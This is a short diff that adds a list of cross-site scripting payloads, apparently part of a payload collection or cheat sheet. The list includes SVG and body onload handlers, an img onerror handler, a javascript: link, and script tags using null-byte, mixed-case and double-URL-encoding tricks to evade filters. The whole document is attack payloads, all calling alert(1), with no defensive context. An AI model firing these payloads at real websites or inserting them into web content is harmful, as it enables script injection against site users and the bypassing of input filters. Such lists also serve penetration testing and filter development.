@@ -1,0 +1,10 @@
+<svg/onload=alert(1)>
+<a href="javascript:alert(1)">
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<!-- Null characters -->
+<script>%00alert(1)</script>
+<!-- Case sensitivity (sometimes works) -->
+<ScRiPt>alert(1)</sCrIpT>
+<!-- Double URL Encoding -->
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
